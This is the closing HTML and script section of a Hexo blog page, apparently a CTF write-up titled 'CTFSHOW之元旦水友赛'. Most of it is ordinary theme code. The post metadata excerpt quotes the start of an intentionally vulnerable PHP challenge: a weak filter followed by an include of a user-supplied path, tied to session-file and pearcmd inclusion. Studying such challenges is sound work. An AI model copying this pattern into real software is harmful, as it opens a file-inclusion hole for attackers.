+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "CTFSHOW之元旦水友赛",
+          url: "http://example.com/2025/06/24/CTFSHOW%E4%B9%8B%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/",
+          excerpt: "",
+          description: "",
+          stripContent: " web  easy_include （session文件包含/pearcmd） 12345678910&amp;lt;?phpfunction waf($path)&amp;#123;    $path = str_replace(&amp;quot;.&amp;quot;,&amp;quot;&amp;quot;,$path);    return preg_match(&amp;quot;/^[a-z]+/&amp;quot;,$path);&amp;#125;if(waf($_POST[1]))&amp;#123;    include &amp;quot;file://&amp;",
+          date: "Tue Jun 24 2025 00:49:35 GMT+0800",
+          updated: "Fri Oct 03 2025 14:57:48 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
